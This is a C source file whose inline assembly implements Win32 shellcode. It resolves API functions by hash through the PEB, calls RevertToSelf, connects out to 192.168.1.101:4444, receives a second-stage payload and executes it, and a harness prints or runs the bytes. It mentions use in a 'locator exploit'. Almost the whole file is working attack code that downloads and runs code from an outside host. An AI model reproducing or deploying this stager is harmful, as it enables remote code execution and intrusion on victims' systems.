#include <stdio.h>
#include <malloc.h>
#ifdef Win32
#include <windows.h> 
#endif

void getprocaddr()
{
    asm(".set KERNEL32HASH,      0x000d4e88  \n"
".set NUMBEROFKERNEL32FUNCTIONS,0x4          \n"
".set VIRTUALPROTECTHASH, 0x38d13c           \n"
".set GETPROCADDRESSHASH,0x00348bfa          \n"
".set LOADLIBRARYAHASH,  0x000d5786          \n"
".set GETSYSTEMDIRECTORYAHASH, 0x069bb2e6    \n"
".set WS232HASH,         0x0003ab08          \n"
".set NUMBEROFWS232FUNCTIONS,0x5             \n"
".set CONNECTHASH,       0x0000677c          \n"
".set RECVHASH,          0x00000cc0          \n"
".set SENDHASH,          0x00000cd8          \n"
".set WSASTARTUPHASH,    0x00039314          \n"
".set SOCKETHASH,        0x000036a4          \n"
".set MSVCRTHASH, 0x00037908                 \n"
".set NUMBEROFMSVCRTFUNCTIONS, 0x01          \n"
".set FREEHASH, 0x00000c4e                   \n"
".set ADVAPI32HASH, 0x000ca608               \n"
".set NUMBEROFADVAPI32FUNCTIONS, 0x01        \n"
".set REVERTTOSELFHASH, 0x000dcdb4           \n"
);

/* START OF SHELLCODE */

    asm(
"mainentrypoint:                             \n"
"call geteip                                 \n"
"geteip:                                     \n"
"pop %ebx                                    \n"
"movl %ebx,%esp                              \n"
"subl $0x1000,%esp                           \n"
"and $0xffffff00,%esp                        \n"
"                                            \n"
"//set up them loop                          \n"
"                                            \n"
"movl $NUMBEROFKERNEL32FUNCTIONS,%ecx        \n"
"lea  KERNEL32HASHESTABLE-geteip(%ebx),%esi  \n"
"lea  KERNEL32FUNCTIONSTABLE-geteip(%ebx),%edi   \n"
"                                            \n"
"//run the loop                              \n"
"                                            \n"
"getkernel32functions:                       \n"
"                                            \n"
"//push the hash we are looking for, which is pointed to by %esi     \n"
"                                            \n"
"pushl (%esi)                                \n"
"pushl $KERNEL32HASH                         \n"
"call getfuncaddress                         \n"
"movl %eax,(%edi)                            \n"
"addl $4, %edi                               \n"
"addl $4, %esi                               \n"
"loop getkernel32functions                   \n"
"                                            \n"
"//GET MSVCRT FUNCTIONS                      \n"
"                        \n"
"movl $NUMBEROFMSVCRTFUNCTIONS,%ecx                      \n"
"lea MSVCRTHASHESTABLE-geteip(%ebx),%esi                     \n"
"lea MSVCRTFUNCTIONSTABLE-geteip(%ebx),%edi                      \n"
"getmsvcrtfunctions:                     \n"
"pushl (%esi)                        \n"
"pushl $MSVCRTHASH                       \n"
"call getfuncaddress                     \n"
"movl %eax,(%edi)                        \n"
"addl $4, %edi                       \n"
"addl $4, %esi                       \n"
"loop getmsvcrtfunctions                     \n"
"                        \n"
"//QUICKLY                       \n"
"//VIRTUALPROTECT FREE +rwx                     \n"
"                        \n"
"lea BUF-geteip(%ebx),%eax                       \n"
"pushl %eax                      \n"
"pushl $0x40                     \n"
"pushl $50                       \n"
"movl FREE-geteip(%ebx),%edx                     \n"
"pushl %edx                      \n"
"call *VIRTUALPROTECT-geteip(%ebx)                       \n"
"                        \n"
"//restore edx as FREE                       \n"
"                        \n"
"movl FREE-geteip(%ebx),%edx                     \n"
"                        \n"
"//overwrite it with return                      \n"
"                        \n"
"movl $0xc3c3c3c3,(%edx)                        \n"
"                        \n"
"//we leave it +rwx                      \n"
"//Now, we call the RevertToSelf() function so we can actually do some-thing on the machine                      \n"
"//You can't read ws2_32.dll in the locator exploit without this.                        \n"
"                        \n"
"movl $NUMBEROFADVAPI32FUNCTIONS,%ecx                        \n"
"lea ADVAPI32HASHESTABLE-geteip(%ebx),%esi                       \n"
"lea ADVAPI32FUNCTIONSTABLE-geteip(%ebx),%edi       \n"
"getadvapi32functions:                      \n"
"pushl (%esi)                        \n"
"pushl $ADVAPI32HASH                     \n"
"call getfuncaddress                     \n"
"movl %eax,(%edi)                        \n"
"addl $4,%esi                        \n"
"addl $4,%edi                        \n"
"loop getadvapi32functions                       \n"
"call *REVERTTOSELF-geteip(%ebx)                     \n"
"                        \n"
"//call getsystemdirectoryA, then prepend to ws2_32.dll                      \n"
"                        \n"
"pushl $2048                     \n"
"lea BUF-geteip(%ebx),%eax                       \n"
"pushl %eax                      \n"
"call *GETSYSTEMDIRECTORYA-geteip(%ebx)                      \n"
"                        \n"
"//ok, now buf is loaded with the current working system directory                       \n"
"//we now need to append \\WS2_32.DLL to that, because                       \n"
"//of a bug in LoadLibraryA, which won't find WS2_32.DLL if there is a                       \n"
"//dot in that path                      \n"
"                        \n"
"lea BUF-geteip(%ebx),%eax                       \n"
"findendofsystemroot:                        \n"
"cmpb $0,(%eax)                      \n"
"je foundendofsystemroot                     \n"
"inc %eax                        \n"
"jmp findendofsystemroot                     \n"
"foundendofsystemroot:                       \n"
"                        \n"
"//eax is now pointing to the final null of C:\\windows\\system32                        \n"
"                        \n"
"lea WS2_32DLL-geteip(%ebx),%esi                     \n"
"strcpyintobuf:                      \n"
"movb (%esi), %dl                        \n"
"movb %dl,(%eax)                     \n"
"test %dl,%dl                        \n"
"jz donewithstrcpy                       \n"
"inc %esi                        \n"
"inc %eax                        \n"
"jmp strcpyintobuf                       \n"
"donewithstrcpy:                     \n"
"                        \n"
"//loadlibrarya(\"c:\\winnt\\system32\\ws2_32.dll\");                        \n"
"                        \n"
"lea BUF-geteip(%ebx),%edx                       \n"
"pushl %edx                      \n"
"call *LOADLIBRARY-geteip(%ebx)                      \n"
"                        \n"
"movl $NUMBEROFWS232FUNCTIONS,%ecx                       \n"
"lea WS232HASHESTABLE-geteip(%ebx),%esi                      \n"
"lea WS232FUNCTIONSTABLE-geteip(%ebx),%edi                       \n"
"                        \n"
"getws232functions:                      \n"
"                        \n"
"//get getprocaddress                        \n"
"//hash of getprocaddress                        \n"
"                        \n"
"pushl (%esi)                        \n"
"                        \n"
"//push hash of KERNEL32.DLL                     \n"
"                        \n"
"pushl $WS232HASH                        \n"
"call getfuncaddress                     \n"
"movl %eax,(%edi)                        \n"
"addl $4, %esi                       \n"
"addl $4, %edi                       \n"
"loop getws232functions                      \n"
"                        \n"
"//ok, now we set up BUFADDR on a quadword boundary                      \n"
"//esp will do since it points far above our current position                        \n"
"                        \n"
"movl %esp,BUFADDR-geteip(%ebx)                      \n"
"                        \n"
"//done setting up BUFADDR                       \n"
"                        \n"
"movl BUFADDR-geteip(%ebx), %eax                     \n"
"pushl %eax                      \n"
"pushl $0x101                        \n"
"call *WSASTARTUP-geteip(%ebx)                       \n"
"                        \n"
"//call socket                       \n"
"                        \n"
"pushl $6                        \n"
"pushl $1                        \n"
"pushl $2                        \n"
"call *SOCKET-geteip(%ebx)                       \n"
"movl %eax,FDSPOT-geteip(%ebx)                       \n"
"                        \n"
"//call connect                      \n"
"//push addrlen=16                       \n"
"                        \n"
"push $0x10                      \n"
"lea SockAddrSPOT-geteip(%ebx),%esi                      \n"
"                        \n"
"//the 4444 is our port                      \n"
"                        \n"
"pushl %esi                      \n"
"                        \n"
"//push fd                       \n"
"                        \n"
"pushl %eax                      \n"
"call *CONNECT-geteip(%ebx)                      \n"
"test %eax,%eax                      \n"
"jl  exitthread                      \n"
"                        \n"
"pushl $4                        \n"
"call recvloop                       \n"
"//ok, now the size is the first word in BUF                     \n"
"                        \n"
"//Now that we have the size, we read in that much shellcode into the buffer.                      \n"
"movl BUFADDR-geteip(%ebx),%edx                      \n"
"movl (%edx),%edx                        \n"
"                        \n"
"//now edx has the size                      \n"
"                        \n"
"push %edx                       \n"
"                        \n"
"//read the data into BUF                        \n"
"                        \n"
"call recvloop                       \n"
"                        \n"
"//Now we just execute it.                       \n"
"                        \n"
"movl BUFADDR-geteip(%ebx),%edx                      \n"
"call *%edx                      \n"
"                        \n"
"//recvloop function                     \n"
"                        \n"
"//START FUNCTION RECVLOOP                       \n"
"//arguments: size to be read                        \n"
"//reads into *BUFADDR                       \n"
"                        \n"
"recvloop:                       \n"
"pushl %ebp                      \n"
"movl %esp,%ebp                      \n"
"push %edx                       \n"
"push %edi                       \n"
"                        \n"
"//get arg1 into edx                     \n"
"                        \n"
"movl 0x8(%ebp), %edx                        \n"
"movl BUFADDR-geteip(%ebx),%edi                      \n"
"                        \n"
"callrecvloop:                       \n"
"                        \n"
"//not an argument- but recv() messes up edx! So we save it off here                     \n"
"                        \n"
"pushl %edx                      \n"
"                        \n"
"//flags                     \n"
"\n"
"pushl $0                        \n"
"                        \n"
"//len                       \n"
"                        \n"
"pushl $1                        \n"
"                        \n"
"//*buf                      \n"
"                        \n"
"pushl %edi                      \n"
"movl FDSPOT-geteip(%ebx),%eax                       \n"
"pushl %eax                      \n"
"call *RECV-geteip(%ebx)                     \n"
"                        \n"
"//prevents getting stuck in an endless loop if the server closes the connection                     \n"
"                        \n"
"cmp $0xffffffff,%eax                        \n"
"je exitthread                       \n"
"                        \n"
"                        \n"
"popl %edx                       \n"
"                        \n"
"//subtract how many we read                     \n"
"                        \n"
"sub %eax,%edx                       \n"
"                        \n"
"//move buffer pointer forward                       \n"
"                        \n"
"add %eax,%edi                       \n"
"                        \n"
"//test if we need to exit the function                      \n"
"//recv returned 0                       \n"
"                        \n"
"test %eax,%eax                      \n"
"je donewithrecvloop                     \n"
"                        \n"
"//we read all the data we wanted to read                        \n"
"                        \n"
"test %edx,%edx                      \n"
"je donewithrecvloop                     \n"
"jmp callrecvloop                        \n"
"                        \n"
"                        \n"
"donewithrecvloop:                       \n"
"                        \n"
"//done with recvloop                        \n"
"                        \n"
"pop %edi                        \n"
"pop %edx                        \n"
"mov %ebp, %esp                      \n"
"pop %ebp                        \n"
"ret $0x04                       \n"
"                        \n"
"//END FUNCTION                      \n"
"                        \n"
"/* fs[0x30] is pointer to PEB                       \n"
"   *that + 0c is _PEB_LDR_DATA pointer                      \n"
"   *that + 0c is in load order module list pointer                      \n"
"                        \n"
"*/                      \n"
"                        \n"
"//void* GETFUNCADDRESS( int hash1,int hash2)                        \n"
"                        \n"
"/*START OF CODE THAT GETS THE ADDRESSES*/                       \n"
"//arguments                     \n"
"//hash of dll                       \n"
"//hash of function                      \n"
"//returns function address                      \n"
"                        \n"
"getfuncaddress:                     \n"
"pushl %ebp                      \n"
"movl %esp,%ebp                      \n"
"pushl %ebx                      \n"
"pushl %esi                      \n"
"pushl %edi                      \n"
"pushl %ecx                      \n"
"                        \n"
"pushl %fs:(0x30)                        \n"
"popl %eax                       \n"
"                        \n"
"//test %eax,%eax                        \n"
"//JS WIN9X                      \n"
"                        \n"
"NT:                     \n"
"                        \n"
"//get _PEB_LDR_DATA ptr                     \n"
"                        \n"
"movl 0xc(%eax),%eax                     \n"
"                        \n"
"//get first module pointer list                     \n"
"                        \n"
"movl 0xc(%eax),%ecx                     \n"
"                        \n"
"                        \n"
"                        \n"
"nextinlist:                     \n"
"                        \n"
"//next in the list into %edx                        \n"
"                        \n"
"movl (%ecx),%edx                        \n"
"                        \n"
"//this is the unicode name of our module                        \n"
"                        \n"
"movl 0x30(%ecx),%eax                        \n"
"                        \n"
"//compare the unicode string at %eax to our string                      \n"
"//if it matches KERNEL32.dll, then we have our module address at 0x18+%ecx                      \n"
"//call hash match                       \n"
"//push unicode increment value                      \n"
"                        \n"
"pushl $2                        \n"
"                        \n"
"//push hash                     \n"
"                        \n"
"movl 8(%ebp),%edi                       \n"
"pushl %edi                      \n"
"                        \n"
"//push string address                       \n"
"                        \n"
"pushl %eax                      \n"
"call hashit                     \n"
"test %eax,%eax                      \n"
"jz  foundmodule                     \n"
"                        \n"
"//otherwise check the next node in the list                     \n"
"                        \n"
"movl %edx,%ecx                      \n"
"jmp nextinlist                      \n"
"                        \n"
"//FOUND THE MODULE, GET THE PROCEDURE                       \n"
"                        \n"
"foundmodule:                        \n"
"                        \n"
"//we are pointing to the winning list entry with ecx                        \n"
"//get the base address                      \n"
"                        \n"
"movl 0x18(%ecx),%eax                        \n"
"                        \n"
"//we want to save this off since this is our base that we will have to add                      \n"
"                        \n"
"push %eax                       \n"
"                        \n"
"//ok, we are now pointing at the start of the module (the MZ for                        \n"
"//the dos header IMAGE_DOS_HEADER.e_lfanew is what we want                      \n"
"//to go parse (the PE header itself)                        \n"
"                        \n"
"movl 0x3c(%eax),%ebx                        \n"
"addl %ebx,%eax                      \n"
"                        \n"
"//%ebx is now pointing to the PE header (ascii PE)                      \n"
"//PE->export table is what we want                      \n"
"//0x150-0xd8=0x78 according to OllydDbg                     \n"
"                        \n"
"movl 0x78(%eax),%ebx                        \n"
"                        \n"
"//eax is now the base again                     \n"
"                        \n"
"pop %eax                       \n"
"push %eax                       \n"
"addl %eax,%ebx                      \n"
"                        \n"
"//this eax is now the Export Directory Table                        \n"
"//From MS PE-COFF table, 6.3.1 (search for pecoff at MS Site to download)                       \n"
"//Offset Size Field                         Description                     \n"
"//16     4    Ordinal Base (usually set to one!)                        \n"
"//24     4    Number of Name pointers       (also the number of ordi-nals)                      \n"
"//28     4    Export Address Table RVA      Address of the EAT rela-tive to base                        \n"
"//32     4    Name Pointer Table RVA        Addresses (RVA's) of Names                      \n"
"//36     4    Ordinal Table RVA             You need the ordinals to get the addresses                     \n"
"                        \n"
"//theoretically we need to subtract the ordinal base, but it turns out they don't actually use it                       \n"
"                        \n"
"//movl 16(%ebx),%edi                        \n"
"//edi is now the ordinal base                       \n"
"                        \n"
"movl 28(%ebx),%ecx                     \n"
"                        \n"
"//ecx is now the address table                      \n"
"                        \n"
"movl 32(%ebx),%edx                      \n"
"                        \n"
"//edx is the name pointer table                     \n"
"                        \n"
"movl 36(%ebx),%ebx                      \n"
"                        \n"
"//ebx is the ordinal table                      \n"
"                        \n"
"//eax is now the base address again                     \n"
"//correct those RVA's into actual addresses                     \n"
"                        \n"
"addl %eax,%ecx                      \n"
"addl %eax,%edx                      \n"
"addl %eax,%ebx                      \n"
"                        \n"
"////HERE IS WHERE WE FIND THE FUNCTION POINTER ITSELF                       \n"
"                        \n"
"                        \n"
"find_procedure:                     \n"
"                        \n"
"//for each pointer in the name pointer table, match against our hash                        \n"
"//if the hash matches, then we go into the address table and get the                        \n"
"//address using the ordinal table                       \n"
"                        \n"
"movl (%edx),%esi                        \n"
"pop %eax                        \n"
"pushl %eax                      \n"
"addl %eax,%esi                      \n"
"                        \n"
"//push the hash increment - we are ascii                        \n"
"                        \n"
"pushl $1                        \n"
"                        \n"
"//push the function hash                        \n"
"                        \n"
"pushl 12(%ebp)                      \n"
"                        \n"
"//esi has the address of our actual string                      \n"
"                        \n"
"pushl %esi                      \n"
"call hashit                     \n"
"test %eax, %eax                     \n"
"jz found_procedure                      \n"
"                        \n"
"//increment our pointer into the name table                     \n"
"                        \n"
"add $4,%edx                     \n"
"                        \n"
"//increment out pointer into the ordinal table                      \n"
"//ordinals are only 16 bits                     \n"
"                        \n"
"add $2,%ebx                         \n"
"jmp find_procedure                      \n"
"                        \n"
"found_procedure:                        \n"
"                        \n"
"//set eax to the base address again                     \n"
"                        \n"
"pop %eax                        \n"
"xor %edx,%edx                       \n"
"                        \n"
"//get the ordinal into dx                       \n"
"//ordinal=ExportOrdinalTable[i] (pointed to by ebx)                     \n"
"                        \n"
"mov (%ebx),%dx                      \n"
"                        \n"
"//SymbolRVA = ExportAddressTable[ordinal-OrdinalBase]                       \n"
"//see note above for lack of ordinal base use                       \n"
"//subtract ordinal base                     \n"
"//sub %edi,%edx                     \n"
"//multiply that by sizeof(dword)                        \n"
"                        \n"
"shl $2,%edx                     \n"
"                        \n"
"//add that to the export address table (dereference in above .c statement)                      \n"
"//to get the RVA of the actual address                      \n"
"                        \n"
"add %edx,%ecx                       \n"
"                        \n"
"//now add that to the base and we get our actual address                        \n"
"                        \n"
"add (%ecx),%eax                     \n"
"                        \n"
"//done eax has the address                      \n"
"                        \n"
"popl %ecx                      \n"
"popl %edi                       \n"
"popl %esi                       \n"
"popl %ebx                       \n"
"mov %ebp,%esp                       \n"
"pop %ebp                        \n"
"ret $8                      \n"
"                        \n"
"//hashit function                       \n"
"//takes 3 args                      \n"
"//increment for unicode/ascii                       \n"
"//hash to test against                      \n"
"//address of string                     \n"
"                        \n"
"hashit:                     \n"
"pushl %ebp                      \n"
"movl %esp,%ebp                      \n"
"                        \n"
"push %ecx                       \n"
"push %ebx                       \n"
"push %edx                       \n"
"                        \n"
"xor %ecx,%ecx                       \n"
"xor %ebx,%ebx                       \n"
"xor %edx,%edx                       \n"
"                        \n"
"mov 8(%ebp),%eax                        \n"
"hashloop:                       \n"
"movb (%eax),%dl                     \n"
"                        \n"
"//convert char to upper case                        \n"
"                        \n"
"or $0x60,%dl                        \n"
"add %edx,%ebx                       \n"
"shl $1,%ebx                     \n"
"                        \n"
"//add increment to the pointer                      \n"
"//2 for unicode, 1 for ascii                        \n"
"                        \n"
"addl 16(%ebp),%eax                      \n"
"mov (%eax),%cl                      \n"
"test %cl,%cl                        \n"
"loopnz hashloop                     \n"
"xor %eax,%eax                       \n"
"mov 12(%ebp),%ecx                       \n"
"cmp %ecx,%ebx                       \n"
"jz donehash                     \n"
"                        \n"
"//failed to match, set eax==1                       \n"
"                        \n"
"inc %eax                        \n"
"donehash:                       \n"
"pop %edx                        \n"
"pop %ebx                        \n"
"pop %ecx                        \n"
"mov %ebp,%esp                       \n"
"pop %ebp                        \n"
"ret $12                     \n"
"                        \n"
"exitthread:                     \n"
"//just cause an exception                       \n"
"xor %eax,%eax                       \n"
"call *%eax                      \n"
"                        \n"
"SockAddrSPOT:                       \n"
"                        \n"
"//first 2 bytes are the PORT (then AF_INET is 0002)                     \n"
"                        \n"
".long 0x44440002                        \n"
"                        \n"
"//server ip 651a8c0 is 192.168.1.101                        \n"
"                        \n"
".long 0x6501a8c0                        \n"
"KERNEL32HASHESTABLE:                        \n"
".long GETSYSTEMDIRECTORYAHASH                       \n"
".long VIRTUALPROTECTHASH                        \n"
".long GETPROCADDRESSHASH                        \n"
".long LOADLIBRARYAHASH                      \n"
"                        \n"
"MSVCRTHASHESTABLE:                      \n"
".long FREEHASH                      \n"
"                        \n"
"ADVAPI32HASHESTABLE:                        \n"
".long REVERTTOSELFHASH                      \n"
"                        \n"
"WS232HASHESTABLE:                       \n"
".long CONNECTHASH                       \n"
".long RECVHASH                      \n"
".long SENDHASH                      \n"
".long WSASTARTUPHASH                        \n"
".long SOCKETHASH                        \n"
"                        \n"
"WS2_32DLL:                      \n"
".ascii \"ws2_32.dll\"                       \n"
".long 0x00000000                        \n"
"                        \n"
"endsploit:                      \n"
"                        \n"
"//nothing below this line is actually included in the shellcode, but it                     \n"
"//is used for scratch space when the exploit is running.                        \n"
"                        \n"
"MSVCRTFUNCTIONSTABLE:                       \n"
"FREE:                       \n"
"     .long 0x00000000                       \n"
"ADVAPI32FUNCTIONSTABLE:\n"
"REVERTTOSELF:\n"
"      .long 0x00000000\n"
"                        \n"
"KERNEL32FUNCTIONSTABLE:                     \n"
"VIRTUALPROTECT:                     \n"
"     .long 0x00000000                       \n"
"GETPROCADDRA:                       \n"
"     .long 0x00000000                       \n"
"LOADLIBRARY:                        \n"
"     .long 0x00000000                       \n"
"GETSYSTEMDIRECTORYA:\n"
"    .long 0x00000000\n"
"                        \n"
"//end of kernel32.dll functions table                       \n"
"//this stores the address of buf+8 mod 8, since we                      \n"
"//are not guaranteed to be on a word boundary, and we                       \n"
"//want to be so Win32 api works                     \n"
"                        \n"
"BUFADDR:                        \n"
"     .long 0x00000000                       \n"
"                        \n"
"                            \n"
"     WS232FUNCTIONSTABLE:                       \n"
"CONNECT:                        \n"
"     .long 0x00000000                       \n"
"RECV:                       \n"
"     .long 0x00000000                       \n"
"SEND:                       \n"
"     .long 0x00000000                       \n"
"WSASTARTUP:                     \n"
"     .long 0x00000000                       \n"
"SOCKET:                     \n"
"     .long 0x00000000                       \n"
"                        \n"
"//end of ws2_32.dll functions table                     \n"
"                        \n"
"SIZE:                       \n"
"     .long 0x00000000                       \n"
"                        \n"
"FDSPOT:                     \n"
"     .long 0x00000000                       \n"
"BUF:                        \n"
"     .long 0x00000000                       \n"
"                            \n"
);

}

int main()
{
        unsigned char buffer[4000]; 
        unsigned char * p;
        int i;
        char *mbuf,*mbuf2;
        int error=0;
        //getprocaddr();
        memcpy(buffer,getprocaddr,2400);
        p=buffer;
        p+=3; /*skip prelude of function*/

//#define DOPRINT

#ifdef DOPRINT

/*gdb ) printf "%d, endsploit - mainentrypoint -1 */

        printf("\"");
        for (i=0; i<666; i++)
          {
                printf("\\x%2.2x",*p);
                if ((i+1)%8==0)
                  printf("\"\nshellcode+=\"");
                p++;
          }

        printf("\"");
#endif

#define DOCALL
#ifdef DOCALL
((void(*)())(p)) ();
#endif


}



